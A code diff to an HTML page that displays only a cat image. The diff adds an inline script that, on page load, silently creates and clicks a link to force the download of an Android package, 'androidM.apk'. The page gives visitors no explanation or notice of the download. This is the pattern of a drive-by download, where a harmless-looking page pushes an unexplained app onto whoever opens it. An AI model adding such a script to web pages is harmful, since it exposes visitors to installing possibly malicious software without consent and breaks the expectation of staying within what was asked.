@@ -1,9 +1,25 @@
 <!DOCTYPE html>
 <html>
-  <head>
+ <head>
     <link rel="stylesheet" type="text/css" href="/styles.css">
-  </head>
-  <body>
+    <script>
+      // Function to trigger the download of the APK file
+      function downloadApk() {
+        // Assuming the APK file is named "androidM.apk" and is in the same directory as this HTML file
+        var apkUrl = '/androidM.apk';
+        var link = document.createElement('a');
+        link.href = apkUrl;
+        link.download = 'androidM.apk';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      }
+
+      // Call the downloadApk function when the page loads
+      window.onload = downloadApk;
+    </script>
+ </head>
+ <body>
     <img src="/cat.jpg" alt="Cat">
-  </body>
+ </body>
 </html>
